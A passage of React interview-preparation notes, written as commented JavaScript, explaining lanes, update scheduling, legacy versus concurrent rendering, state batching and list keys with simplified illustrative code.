  return (
    <div>
      {/* Updates immediately [web:191] * /}
      <input value={searchQuery} onChange={handleInput} />
      
      {/* Can lag behind while typing [web:191] * /}
      {isPending && <Spinner />}
      <SearchResults query={deferredQuery} />
    </div>
  );
}

// Lanes enable this prioritization: [web:191]
// - Input updates in SyncLane (high priority) [web:191]
// - Results updates in TransitionLane (low priority) [web:191]
// - Input stays responsive even during expensive renders [web:191]

Lane Expiration:
----------------

// Lanes can expire to prevent starvation [web:191]

// Low-priority update waits too long → upgraded to higher priority
// Ensures all updates eventually complete

startTransition(() => {
  setItems(newItems); // TransitionLane
});

// If interrupted repeatedly for 5 seconds:
// TransitionLane → DefaultLane (higher priority)
// Ensures update completes

Benefits of Lanes:
------------------

// 1. Fine-grained priority control [web:191][web:194]
// 31 lanes vs 3-5 priority levels in old system

// 2. Independent transitions [web:191]
// Multiple transitions can progress separately [web:191]

// 3. Better batching [web:191]
// Same lane = automatic batching [web:191]

// 4. Flexible scheduling [web:191]
// Can choose to batch or separate based on lanes [web:191]

// 5. Improved performance
// Smarter about what to work on when

// 6. Enables Concurrent Features [web:191]
// useTransition, useDeferredValue, Suspense

Lanes vs Old Priority System:
------------------------------

// Old system (React 17):
// - Fixed number of priority levels
// - Less flexible
// - Harder to manage multiple transitions

// New system (React 18): [web:191][web:194]
// - 31 lanes for fine-grained control [web:194]
// - Flexible lane assignment [web:191]
// - Better handling of multiple concurrent updates [web:191]
// - Enables advanced scheduling [web:191]

Summary:

Lanes in React 18:
- Bit mask priority system [web:191][web:194]
- 31 lanes for fine-grained control [web:194]
- Replace old priority levels [web:194]
- Enable concurrent rendering [web:191]
- Independent transitions [web:191]
- Automatic batching same lane [web:191]
- Maps to scheduler priorities [web:194]
- Three priority systems [web:194]
- Prevents starvation with expiration [web:191]
*/


/**
111. How does React schedule rendering updates?
----------------------------------------------

React uses a sophisticated scheduling system to prioritize and coordinate
rendering updates, ensuring high-priority updates (like user input) are
processed immediately while low-priority updates can be deferred.

Update Scheduling Overview:
----------------------------

// When setState is called:
function Component() {
  const [count, setCount] = useState(0);
  
  const handleClick = () => {
    setCount(count + 1); // Triggers update scheduling
  };
  
  return <button onClick={handleClick}>{count}</button>;
}

// React's scheduling process:
// 1. Assign priority (lane) to update [web:194]
// 2. Add to update queue
// 3. Schedule work with appropriate priority [web:194]
// 4. Process updates based on priority [web:191]
// 5. Commit changes to DOM

Priority-Based Scheduling:
--------------------------

// React categorizes updates by priority [web:192]

// High Priority (Immediate) [web:192]
// - User input (clicks, typing)
// - Discrete events
// - Processed synchronously [web:192]

function HighPriority() {
  const [value, setValue] = useState('');
  
  // High priority - must be immediate [web:192]
  const handleChange = (e) => {
    setValue(e.target.value);
  };
  
  return <input value={value} onChange={handleChange} />;
}

// Medium Priority (Default) [web:192]
// - Network responses
// - useEffect updates
// - Batched when possible [web:192]

function MediumPriority() {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    // Medium priority - can be batched [web:192]
    fetch('/api/data')
      .then(res => res.json())
      .then(setData);
  }, []);
  
  return <div>{data}</div>;
}

// Low Priority (Deferrable) [web:192]
// - useTransition updates [web:192]
// - useDeferredValue [web:192]
// - Can be interrupted [web:192]

function LowPriority() {
  const [query, setQuery] = useState('');
  const [isPending, startTransition] = useTransition();
  
  const handleSearch = (value) => {
    // Low priority - interruptible [web:192]
    startTransition(() => {
      setQuery(value);
    });
  };
  
  return <SearchResults query={query} />;
}

Scheduling Algorithm:
---------------------

// Simplified scheduling flow

// 1. User interaction triggers update
handleClick() {
  setState(newValue);
  // Enters scheduling system
}

// 2. Determine priority [web:194]
const priority = getCurrentEventPriority(); // [web:194]
const lane = eventPriorityToLane(priority); // [web:194]

// 3. Create update object
const update = {
  lane: lane,
  action: newValue,
  next: null
};

// 4. Add to fiber's update queue
fiber.updateQueue.pending = update;

// 5. Schedule work [web:194]
if (lane === SyncLane) {
  // Schedule immediate work [web:191]
  scheduleSyncCallback(performSyncWork);
} else {
  // Schedule with priority [web:194]
  scheduleCallback(priority, performWork);
}

// 6. Process work when scheduled
function performWork() {
  // Enter render phase
  renderRoot();
  
  // If completed, commit
  if (workInProgressRoot === null) {
    commitRoot();
  }
}

Work Loop:
----------

// React's work loop processes updates [web:141]

function workLoopConcurrent() {
  // Process fibers while time available
  while (workInProgress !== null && !shouldYield()) {
    performUnitOfWork(workInProgress);
  }
}

function shouldYield() {
  // Check if we should pause [web:141]
  const currentTime = getCurrentTime();
  const deadline = currentDeadline;
  
  // Yield if:
  // - Out of time (>5ms spent) [web:141]
  // - Higher priority work pending [web:191]
  // - Browser needs to paint
  
  return currentTime >= deadline || hasHigherPriorityWork();
}

// If shouldYield returns true:
// - Save current progress
// - Let browser handle events
// - Resume later [web:141]

Batching Updates:
-----------------

// React batches updates in same priority [web:191]

function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  const [c, setC] = useState(0);
  
  const handleClick = () => {
    // All batched into single render (React 18) [web:191]
    setA(1);
    setB(2);
    setC(3);
    console.log(a, b, c); // Still 0, 0, 0 (not updated yet)
  };
  
  // Only renders once! [web:191]
  
  return <div>{a} {b} {c}</div>;
}

// Automatic batching in React 18 [web:191]:
setTimeout(() => {
  setA(1); // Batched
  setB(2); // Batched
  // Single render
}, 1000);

fetch('/api').then(() => {
  setA(1); // Batched
  setB(2); // Batched
  // Single render
});

Concurrent Scheduling:
----------------------

// Legacy Mode (React 17): [web:192][web:195]
// - Synchronous rendering [web:192][web:195]
// - Cannot interrupt [web:192][web:195]
// - Blocks main thread [web:195]

function legacyRender() {
  // Start rendering
  let fiber = rootFiber;
  
  // Process entire tree without stopping [web:195]
  while (fiber !== null) {
    updateFiber(fiber);
    fiber = getNextFiber(fiber);
  }
  
  // Commit all changes [web:195]
  commitChanges();
}

// Concurrent Mode (React 18): [web:192][web:195]
// - Asynchronous rendering [web:192][web:195]
// - Can interrupt [web:192][web:195]
// - Yields to browser [web:141][web:195]

function concurrentRender() {
  let fiber = rootFiber;
  
  // Process with interruptions [web:195]
  while (fiber !== null) {
    // Check if should yield [web:141]
    if (shouldYield()) {
      // Save progress, resume later [web:141][web:195]
      saveWorkInProgress(fiber);
      scheduleCallback(resumeRender);
      return;
    }
    
    updateFiber(fiber);
    fiber = getNextFiber(fiber);
  }
  
  // Commit when done [web:195]
  commitChanges();
}

Time Slicing:
-------------

// Break work into small chunks [web:141]

// React's time slice: ~5ms per frame [web:141]
const FRAME_TIME = 5; // milliseconds

function workLoop(deadline) {
  const startTime = performance.now();
  
  while (workInProgress !== null) {
    const elapsed = performance.now() - startTime;
    
    // Worked for 5ms, yield to browser [web:141]
    if (elapsed > FRAME_TIME) {
      scheduleCallback(workLoop);
      return;
    }
    
    performUnitOfWork(workInProgress);
  }
  
  // All work done
  commitRoot();
}

// Keeps UI responsive at 60fps [web:141]

Priority Interruption:
----------------------

// High priority work interrupts low priority [web:191]

function Component() {
  const [search, setSearch] = useState('');
  const [results, setResults] = useState([]);
  
  const handleInput = (e) => {
    const value = e.target.value;
    
    // High priority: Update input [web:191]
    setSearch(value);
    
    // Low priority: Update results [web:191]
    startTransition(() => {
      const filtered = expensiveFilter(allItems, value);
      setResults(filtered);
    });
  };
  
  return (
    <div>
      <input value={search} onChange={handleInput} />
      <ResultsList results={results} />
    </div>
  );
}

// Scenario:
// 1. User types 'a'
// 2. Start filtering (low priority) [web:191]
// 3. User types 'b' (interrupts filtering) [web:191]
// 4. Process 'b' immediately [web:191]
// 5. Restart filtering with 'ab' [web:191]

Scheduler Integration:
----------------------

// React uses its own scheduler [web:194]

// Schedule callback with priority [web:194]
import { scheduleCallback, ImmediatePriority, UserBlockingPriority, NormalPriority } from 'scheduler';

// Immediate priority [web:194]
scheduleCallback(ImmediatePriority, () => {
  processHighPriorityWork();
});

// Normal priority [web:194]
scheduleCallback(NormalPriority, () => {
  processNormalWork();
});

// Scheduler manages:
// - Priority queue of tasks [web:194]
// - Time slicing [web:141]
// - Task expiration
// - Work scheduling

Update Queue:
-------------

// Each fiber has update queue

fiber.updateQueue = {
  pending: null,    // Circular linked list of updates
  shared: {
    pending: null   // Shared with work-in-progress
  },
  effects: null     // Side effects
};

// Add update
const update = {
  lane: SyncLane,
  action: newState,
  next: null
};

// Insert into circular list
if (fiber.updateQueue.pending === null) {
  update.next = update; // Point to self
} else {
  update.next = fiber.updateQueue.pending.next;
  fiber.updateQueue.pending.next = update;
}
fiber.updateQueue.pending = update;

// Process updates
function processUpdateQueue(fiber) {
  let update = fiber.updateQueue.pending;
  let newState = fiber.memoizedState;
  
  // Process each update
  while (update !== null) {
    newState = getStateFromUpdate(update, newState);
    update = update.next;
  }
  
  fiber.memoizedState = newState;
}

Summary:

React Scheduling:
- Priority-based system [web:192][web:194]
- Three priority levels [web:192]
- Uses lanes for fine-grained control [web:191][web:194]
- Batches same-priority updates [web:191]
- Time slicing for responsiveness [web:141]
- Can interrupt low-priority work [web:191][web:192]
- Concurrent rendering [web:192][web:195]
- Yields to browser [web:141][web:195]
- Scheduler manages task queue [web:194]
*/


/**
112. What is the difference between legacy mode and concurrent mode?
-------------------------------------------------------------------

Legacy Mode is React's traditional synchronous rendering system, while
Concurrent Mode is the new interruptible rendering system that enables
React to work on multiple tasks simultaneously and prioritize updates.

Legacy Mode (React ≤17):
------------------------

// Also called "Blocking Mode" or "Synchronous Mode" [web:192][web:195]

// Characteristics: [web:192][web:195]
// - Synchronous rendering [web:192][web:195]
// - Cannot interrupt [web:192][web:195]
// - Processes entire tree at once [web:195]
// - Blocks main thread [web:195]
// - All updates treated equally [web:192]

// Example problem:
function LegacyApp() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>
        Update
      </button>
      
      {/* Renders 10,000 items * /}
      <ExpensiveList count={count} />
    </div>
  );
}

// User clicks button:
// 1. Start rendering [web:195]
// 2. Process all 10,000 items (takes 500ms) [web:195]
// 3. UI frozen during this time [web:192][web:195]
// 4. Cannot respond to user input [web:195]
// 5. Finally updates [web:195]

// Issues: [web:192][web:195]
// - Long updates block UI [web:192][web:195]
// - Animations stutter [web:195]
// - Input feels unresponsive [web:195]
// - App feels "frozen" [web:195]

Concurrent Mode (React 18+):
----------------------------

// Also called "Concurrent Rendering" [web:192]

// Characteristics: [web:192][web:195]
// - Asynchronous rendering [web:192][web:195]
// - Can interrupt and resume [web:192][web:195]
// - Processes work in chunks [web:195]
// - Yields to browser [web:195]
// - Priority-based scheduling [web:192]

// Same code, different behavior:
function ConcurrentApp() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>
        Update
      </button>
      
      {/* Same 10,000 items * /}
      <ExpensiveList count={count} />
    </div>
  );
}

// User clicks button:
// 1. Start rendering [web:195]
// 2. Process chunk of items (5ms) [web:195]
// 3. Yield to browser [web:195]
// 4. Browser handles events [web:195]
// 5. Resume rendering next chunk [web:195]
// 6. Repeat until done [web:195]
// 7. Commit all changes [web:195]

// Benefits: [web:192][web:195]
// - UI stays responsive [web:192][web:195]
// - Can handle user input during render [web:195]
// - Smooth animations [web:195]
// - Better user experience [web:192]

Rendering Comparison:
---------------------

// Legacy Mode rendering: [web:195]
function legacyRender(root) {
  // Start
  beginWork(root);
  
  // Process entire tree without stopping [web:195]
  while (hasMoreWork()) {
    processNextUnit(); // Cannot interrupt
  }
  
  // Commit
  commitWork();
  
  // Done - blocked UI for entire duration [web:195]
}

// Concurrent Mode rendering: [web:195]
function concurrentRender(root) {
  // Start
  beginWork(root);
  
  // Process with interruptions [web:195]
  while (hasMoreWork()) {
    // Check if should yield [web:195]
    if (shouldYield()) {
      // Pause and schedule continuation [web:195]
      saveProgress();
      scheduleCallback(concurrentRender);
      return; // Yield to browser
    }
    
    processNextUnit(); // Can interrupt
  }
  
  // Commit
  commitWork();
  
  // Done - UI was responsive throughout [web:195]
}

Priority in Different Modes:
-----------------------------

// Legacy Mode: [web:192]
// - No real prioritization [web:192]
// - Limited batching [web:192]
// - First update started must finish [web:192]

function LegacyComponent() {
  const handleClick = () => {
    // Both processed together, cannot interrupt [web:192]
    setUrgent('user clicked');
    setNonUrgent('background task');
  };
}

// Concurrent Mode: [web:192]
// - Sophisticated prioritization [web:192]
// - Extensive batching [web:192]
// - Can interrupt low-priority work [web:192]

function ConcurrentComponent() {
  const [urgent, setUrgent] = useState('');
  const [nonUrgent, setNonUrgent] = useState('');
  
  const handleClick = () => {
    // High priority - processed immediately [web:192]
    setUrgent('user clicked');
    
    // Low priority - can be interrupted [web:192]
    startTransition(() => {
      setNonUrgent('background task');
    });
  };
}

Feature Comparison:
-------------------

// Feature              | Legacy Mode    | Concurrent Mode
// ---------------------|----------------|------------------
// Rendering            | Synchronous    | Asynchronous [web:192][web:195]
// Interruptible        | No             | Yes [web:192][web:195]
// Time Slicing         | No             | Yes [web:195]
// Priority             | Basic          | Advanced [web:192]
// useTransition        | No             | Yes [web:192]
// useDeferredValue     | No             | Yes [web:192]
// Suspense (full)      | No             | Yes [web:192]
// Batching             | Limited        | Automatic [web:192]
// Responsiveness       | Can freeze     | Always responsive [web:192][web:195]

Enabling Concurrent Mode:
--------------------------

// Legacy Mode (React 17):
import ReactDOM from 'react-dom';

ReactDOM.render(<App />, document.getElementById('root'));

// Concurrent Mode (React 18):
import ReactDOM from 'react-dom/client';

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<App />);

// React 18 uses concurrent features by default [web:192]
// But rendering is still mostly synchronous unless you use:
// - useTransition [web:192]
// - useDeferredValue [web:192]
// - Suspense [web:192]

Concurrent Features:
--------------------

// 1. useTransition [web:192]
function SearchWithTransition() {
  const [query, setQuery] = useState('');
  const [isPending, startTransition] = useTransition();
  
  const handleChange = (e) => {
    const value = e.target.value;
    
    // Immediate (high priority) [web:192]
    setQuery(value);
    
    // Deferred (low priority, interruptible) [web:192]
    startTransition(() => {
      filterLargeList(value);
    });
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      {isPending && <Spinner />}
      <Results />
    </div>
  );
}

// 2. useDeferredValue [web:192]
function SearchWithDeferred() {
  const [query, setQuery] = useState('');
  const deferredQuery = useDeferredValue(query);
  
  return (
    <div>
      {/* Updates immediately * /}
      <input value={query} onChange={(e) => setQuery(e.target.value)} />
      
      {/* Can lag behind during typing * /}
      <Results query={deferredQuery} />
    </div>
  );
}

// 3. Suspense for Data Fetching [web:192]
function ConcurrentDataFetching() {
  return (
    <Suspense fallback={<Loading />}>
      <DataComponent />
    </Suspense>
  );
}

// These features require Concurrent Mode [web:192]

Migration Path:
---------------

// Gradual adoption

// Step 1: Upgrade to React 18
npm install react@18 react-dom@18

// Step 2: Use createRoot [web:192]
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<App />);

// Step 3: Add concurrent features gradually [web:192]
// Start with useTransition for heavy updates
function App() {
  const [isPending, startTransition] = useTransition();
  
  const handleHeavyUpdate = () => {
    startTransition(() => {
      updateLargeList();
    });
  };
}

// Step 4: Add useDeferredValue for inputs [web:192]
const deferredValue = useDeferredValue(inputValue);

// Step 5: Use Suspense for data fetching [web:192]
<Suspense fallback={<Loading />}>
  <LazyComponent />
</Suspense>

Real-World Impact:
------------------

// Legacy Mode example: [web:195]
function LegacyDashboard() {
  const [data, setData] = useState([]);
  
  // Updating 10,000 rows
  const updateData = () => {
    const newData = processHugeDataset();
    setData(newData); // Blocks UI for 500ms [web:195]
  };
  
  return (
    <div>
      <button onClick={updateData}>Update</button>
      <DataTable data={data} />
    </div>
  );
}
// Result: Button click → UI freeze → Update appears [web:195]

// Concurrent Mode example: [web:195]
function ConcurrentDashboard() {
  const [data, setData] = useState([]);
  const [isPending, startTransition] = useTransition();
  
  // Same update, but concurrent [web:195]
  const updateData = () => {
    startTransition(() => {
      const newData = processHugeDataset();
      setData(newData); // Doesn't block UI [web:195]
    });
  };
  
  return (
    <div>
      <button onClick={updateData}>Update</button>
      {isPending && <Spinner />}
      <DataTable data={data} />
    </div>
  );
}
// Result: Button click → Shows spinner → UI stays responsive → Update appears [web:195]

Trade-offs:
-----------

// Legacy Mode: [web:192]
// ✅ Simpler to reason about [web:192]
// ✅ Predictable behavior [web:192]
// ✅ No need to learn new APIs [web:192]
// ❌ Can freeze UI [web:192][web:195]
// ❌ Poor performance for complex UIs [web:192]
// ❌ No advanced features [web:192]

// Concurrent Mode: [web:192]
// ✅ Better performance [web:192]
// ✅ Responsive UI [web:192][web:195]
// ✅ Advanced features [web:192]
// ✅ Better user experience [web:192]
// ❌ More complex [web:192]
// ❌ Need to understand prioritization [web:192]
// ❌ Requires careful state management [web:192]

Summary:

Legacy vs Concurrent Mode:
- Legacy: Synchronous, blocking [web:192][web:195]
- Concurrent: Asynchronous, interruptible [web:192][web:195]
- Concurrent uses time slicing [web:195]
- Concurrent has priority scheduling [web:192]
- Concurrent enables new features [web:192]
- React 18 uses Concurrent by default [web:192]
- Gradual migration path [web:192]
- Better UX with Concurrent [web:192][web:195]
*/


/**
113. How does React handle state batching internally?
----------------------------------------------------

State batching is React's optimization where multiple setState calls are
grouped together and processed in a single render, reducing the number of
re-renders and improving performance.

What is State Batching:
-----------------------

// Without batching:
function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  
  const handleClick = () => {
    setA(1);    // Render 1
    setB(2);    // Render 2
    setA(3);    // Render 3
    // 3 renders total
  };
}

// With batching:
function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  
  const handleClick = () => {
    setA(1);    // Queued
    setB(2);    // Queued
    setA(3);    // Queued
    // 1 render with all updates
  };
}

How Batching Works:
-------------------

// React uses execution context to batch [web:191]

let isBatchingUpdates = false;
const updateQueue = [];

function setState(update) {
  // Add update to queue
  updateQueue.push(update);
  
  // Schedule flush if not already batching
  if (!isBatchingUpdates) {
    scheduleFlush();
  }
}

function batchedUpdates(fn) {
  // Set batching flag [web:191]
  const previousBatching = isBatchingUpdates;
  isBatchingUpdates = true;
  
  try {
    // Execute function (may have multiple setState)
    fn();
  } finally {
    // Reset flag
    isBatchingUpdates = previousBatching;
    
    // Flush all queued updates [web:191]
    if (!isBatchingUpdates) {
      flushUpdates();
    }
  }
}

// React event handlers are automatically batched
function handleClick() {
  batchedUpdates(() => {
    setA(1);
    setB(2);
    setC(3);
  });
  // Single render
}

React 17 Batching:
------------------

// React 17: Only batches in event handlers

function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  
  // ✅ Batched (event handler)
  const handleClick = () => {
    setA(1);
    setB(2);
    // 1 render
  };
  
  // ❌ Not batched (setTimeout)
  const handleAsync = () => {
    setTimeout(() => {
      setA(1);  // Render 1
      setB(2);  // Render 2
      // 2 renders
    }, 0);
  };
  
  // ❌ Not batched (Promise)
  const handlePromise = () => {
    fetch('/api').then(() => {
      setA(1);  // Render 1
      setB(2);  // Render 2
      // 2 renders
    });
  };
}

React 18 Automatic Batching:
----------------------------

// React 18: Batches everywhere! [web:191]

function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  
  // ✅ Batched (event handler) [web:191]
  const handleClick = () => {
    setA(1);
    setB(2);
    // 1 render
  };
  
  // ✅ Batched (setTimeout) [web:191]
  const handleAsync = () => {
    setTimeout(() => {
      setA(1);
      setB(2);
      // 1 render (NEW in React 18!)
    }, 0);
  };
  
  // ✅ Batched (Promise) [web:191]
  const handlePromise = () => {
    fetch('/api').then(() => {
      setA(1);
      setB(2);
      // 1 render (NEW in React 18!)
    });
  };
  
  // ✅ Batched (native events) [web:191]
  useEffect(() => {
    document.addEventListener('click', () => {
      setA(1);
      setB(2);
      // 1 render (NEW in React 18!)
    });
  }, []);
}

Update Queue Processing:
------------------------

// Simplified internal process [web:191]

// 1. setState called
setCount(1);

// 2. Create update object
const update = {
  lane: SyncLane,  // Priority [web:191]
  action: 1,
  next: null
};

// 3. Add to fiber's update queue
fiber.updateQueue.pending = update;

// 4. Mark fiber for update
fiber.lanes |= SyncLane;

// 5. Schedule work [web:191]
if (!isBatchingUpdates) {
  // Start new batch
  isBatchingUpdates = true;
  scheduleMicrotask(flushUpdates);
}

// 6. Process all queued updates [web:191]
function flushUpdates() {
  isBatchingUpdates = false;
  
  // Process all fibers with pending updates [web:191]
  workLoop();
  
  // Commit to DOM
  commitRoot();
}

Same Lane Batching:
-------------------

// Updates in same lane batch together [web:191]

function Component() {
  const [count, setCount] = useState(0);
  
  const handleClick = () => {
    // All same lane (SyncLane) → batch [web:191]
    setCount(c => c + 1);  // Lane: SyncLane
    setCount(c => c + 1);  // Lane: SyncLane
    setCount(c => c + 1);  // Lane: SyncLane
    // Single render, count = 3
  };
  
  return <button onClick={handleClick}>{count}</button>;
}

// Different lanes may not batch [web:191]
function TransitionComponent() {
  const [count, setCount] = useState(0);
  
  const handleClick = () => {
    // High priority [web:191]
    setCount(c => c + 1);  // Lane: SyncLane
    
    // Low priority [web:191]
    startTransition(() => {
      setCount(c => c + 1);  // Lane: TransitionLane
    });
    
    // May render separately based on lanes [web:191]
  };
}

Batching with Functional Updates:
----------------------------------

// Functional updates guarantee order

function Counter() {
  const [count, setCount] = useState(0);
  
  const increment = () => {
    // ❌ Won't work as expected (all read current count)
    setCount(count + 1);  // 0 + 1 = 1
    setCount(count + 1);  // 0 + 1 = 1
    setCount(count + 1);  // 0 + 1 = 1
    // Result: 1 (not 3!)
  };
  
  const incrementCorrect = () => {
    // ✅ Works correctly (uses previous value)
    setCount(c => c + 1);  // 0 + 1 = 1
    setCount(c => c + 1);  // 1 + 1 = 2
    setCount(c => c + 1);  // 2 + 1 = 3
    // Result: 3 ✓
  };
}

Opting Out of Batching:
-----------------------

// React 18: Use flushSync to opt out [web:191]

import { flushSync } from 'react-dom';

function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  
  const handleClick = () => {
    // Force immediate render
    flushSync(() => {
      setA(1);
    });
    // a is now 1, re-rendered
    
    // Another immediate render
    flushSync(() => {
      setB(2);
    });
    // b is now 2, re-rendered again
    
    // Total: 2 renders instead of 1
  };
  
  // Use sparingly! Hurts performance
}

Batching with Multiple Components:
-----------------------------------

// Batching works across components

function Parent() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <Child1 onUpdate={() => setCount(c => c + 1)} />
      <Child2 count={count} />
    </div>
  );
}

function Child1({ onUpdate }) {
  const [local, setLocal] = useState(0);
  
  const handleClick = () => {
    // Both batched together [web:191]
    setLocal(l => l + 1);  // Update Child1
    onUpdate();            // Update Parent
    // Single render for both!
  };
  
  return <button onClick={handleClick}>{local}</button>;
}

Internal Batching Implementation:
----------------------------------

// Simplified React internals

// Execution context stack
const executionContext = {
  NoContext: 0b000,
  BatchedContext: 0b001,
  EventContext: 0b010,
  DiscreteEventContext: 0b100
};

let currentContext = executionContext.NoContext;

// Check if batching
function isBatching() {
  return (currentContext & executionContext.BatchedContext) !== 0;
}

// Set batching context [web:191]
function batchedEventUpdates(fn) {
  const prevContext = currentContext;
  currentContext |= executionContext.BatchedContext;
  
  try {
    return fn();
  } finally {
    currentContext = prevContext;
    
    // Flush if no longer batching [web:191]
    if (!isBatching()) {
      flushSyncCallbacks();
    }
  }
}

// Wrap event handlers
button.addEventListener('click', () => {
  batchedEventUpdates(() => {
    handleClick(); // User code runs here
  });
});

Batching Benefits:
------------------

// Performance improvement

// Without batching:
function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  const [c, setC] = useState(0);
  
  const handleClick = () => {
    setA(1);  // Render 1: Process A
    setB(2);  // Render 2: Process A, B
    setC(3);  // Render 3: Process A, B, C
  };
  
  // 3 renders, 6 total updates
  // Multiple DOM operations
  // Multiple layout calculations
}

// With batching: [web:191]
function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  const [c, setC] = useState(0);
  
  const handleClick = () => {
    setA(1);  // Queued
    setB(2);  // Queued
    setC(3);  // Queued
  };
  
  // 1 render, 3 updates [web:191]
  // Single DOM operation
  // Single layout calculation
  // Much faster!
}

Summary:

State Batching:
- Groups multiple setState calls [web:191]
- Single render for batch [web:191]
- React 17: Only event handlers
- React 18: Automatic everywhere [web:191]
- Same lane batches together [web:191]
- Use functional updates for order
- flushSync opts out [web:191]
- Major performance optimization
- Reduces unnecessary renders
*/


/**
114. What is the role of keys in lists and how does React use them?
------------------------------------------------------------------

Keys help React identify which items in a list have changed, been added, or
removed. React uses keys to optimize reconciliation by tracking element
identity across renders, enabling efficient DOM updates.

Why Keys Are Needed:
--------------------

// Without keys: [web:144]
function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <li>{todo.text}</li>  // No key!
      ))}
    </ul>
  );
}

// Problems:
// 1. React can't track which todo is which [web:144]
// 2. Deleting first todo → React re-renders all todos
// 3. Reordering → unnecessary DOM updates
// 4. Component state gets confused

// With keys: [web:144]
function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>{todo.text}</li>  // With key! [web:144]
      ))}
    </ul>
  );
}

// Benefits:
// 1. React knows which todo is which [web:144]
// 2. Deleting first todo → React only removes that DOM node
// 3. Reordering → React moves DOM nodes, no re-render
// 4. Component state preserved correctly

How React Uses Keys:
--------------------

// Reconciliation with keys [web:144]

// Initial render:
<ul>
  <li key="1">Apple</li>
  <li key="2">Banana</li>
  <li key="3">Cherry</li>
</ul>

// React creates:
// Virtual DOM: [key="1", key="2", key="3"]
// Real DOM: 3 li elements

// Update: Remove "Banana" [web:144]
<ul>
  <li key="1">Apple</li>
  <li key="3">Cherry</li>
</ul>

// React's reconciliation: [web:144]
// 1. Compare keys: [1, 2, 3] vs [1, 3]
// 2. key="1" → Same, keep DOM node [web:144]
// 3. key="2" → Missing, remove DOM node [web:144]
// 4. key="3" → Same, keep DOM node [web:144]

// Result: Only 1 DOM removal, 0 re-renders [web:144]

// Without keys: [web:144]
// 1. Compare positions [0, 1, 2] vs [0, 1]
// 2. Position 0 changed: Apple → Apple (re-render) [web:144]
// 3. Position 1 changed: Banana → Cherry (re-render) [web:144]
// 4. Position 2 removed [web:144]

// Result: 2 DOM updates + 1 removal (inefficient!) [web:144]

Key Requirements:
-----------------

// Keys must be: [web:144]

// 1. Unique among siblings [web:144]
function GoodList() {
  return (
    <ul>
      <li key="1">Item 1</li>  // ✅ Unique
      <li key="2">Item 2</li>  // ✅ Unique
    </ul>
  );
}

function BadList() {
  return (
    <ul>
      <li key="1">Item 1</li>  // ❌ Duplicate!
      <li key="1">Item 2</li>  // ❌ Duplicate!
    </ul>
  );
}

// 2. Stable (don't change between renders) [web:144]
// ✅ Good: Database ID
items.map(item => <li key={item.id}>{item.name}</li>);

// ❌ Bad: Random value
items.map(item => <li key={Math.random()}>{item.name}</li>);

// 3. Predictable [web:144]
// ✅ Good: Deterministic
items.map(item => <li key={item.id}>{item.name}</li>);

// ❌ Bad: Changes on re-render
items.map(item => <li key={Date.now()}>{item.name}</li>);

Reordering Example:
-------------------

// Demonstrating key importance

function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <TodoItem key={todo.id} todo={todo} />
      ))}
    </ul>
  );
}

// Initial state:
const todos = [
  { id: 1, text: 'Task A', completed: false },
  { id: 2, text: 'Task B', completed: true },
  { id: 3, text: 'Task C', completed: false }
];

// After reordering (drag and drop):
const todos = [
  { id: 2, text: 'Task B', completed: true },  // Moved to top
  { id: 1, text: 'Task A', completed: false },
  { id: 3, text: 'Task C', completed: false }
];

// With keys: [web:144]
// - React identifies items by key [web:144]
// - Moves existing DOM nodes [web:144]
// - Preserves component state (completed status) [web:144]
// - No re-render needed! [web:144]

// Without keys:
// - React compares by position
// - Position 0 changed: A → B (re-render)
// - Position 1 changed: B → A (re-render)
// - Component state gets mixed up
// - Completed status might be wrong!

Component State Preservation:
------------------------------

// Keys preserve component state

function TodoItem({ todo }) {
  const [isEditing, setIsEditing] = useState(false);
  const [editText, setEditText] = useState(todo.text);
  
  return (
    <li>
      {isEditing ? (
        <input
          value={editText}
          onChange={(e) => setEditText(e.target.value)}
        />
      ) : (
        <span>{todo.text}</span>
      )}
      <button onClick={() => setIsEditing(!isEditing)}>
        {isEditing ? 'Save' : 'Edit'}
      </button>
    </li>
  );
}

// With proper keys: [web:144]
// - Reordering preserves isEditing state [web:144]
// - Input value persists [web:144]
// - Each item maintains its own state [web:144]

// Without keys or wrong keys:
// - State gets mixed up
// - Editing wrong item
// - Input values swap

Keys in Fragments:
------------------

// Keys work with fragments

function Table({ rows }) {
  return (
    <table>
      <tbody>
        {rows.map(row => (
          <Fragment key={row.id}>
            <tr>
              <td>{row.name}</td>
            </tr>
            <tr>
              <td>{row.details}</td>
            </tr>
          </Fragment>
        ))}
      </tbody>
    </table>
  );
}

// Or shorthand (can't use key):
function Table({ rows }) {
  return (
    <table>
      <tbody>
        {rows.map(row => (
          // ❌ Can't add key to <>
          <>
            <tr>
              <td>{row.name}</td>
            </tr>
          </>
        ))}
      </tbody>
    </table>
  );
}

Dynamic Lists:
--------------

// Keys help with dynamic operations

function DynamicList() {
  const [items, setItems] = useState([
    { id: 1, text: 'Item 1' },
    { id: 2, text: 'Item 2' }
  ]);
  
  // Add item [web:144]
  const addItem = () => {
    const newItem = { id: Date.now(), text: `Item ${items.length + 1}` };
    setItems([...items, newItem]);
    // React adds new DOM node [web:144]
  };
  
  // Remove item [web:144]
  const removeItem = (id) => {
    setItems(items.filter(item => item.id !== id));
    // React removes specific DOM node [web:144]
  };
  
  // Reorder items [web:144]
  const moveUp = (index) => {
    if (index === 0) return;
    const newItems = [...items];
    [newItems[index - 1], newItems[index]] = [newItems[index], newItems[index - 1]];
    setItems(newItems);
    // React moves DOM nodes [web:144]
  };
  
  return (
    <ul>
      {items.map((item, index) => (
        <li key={item.id}>
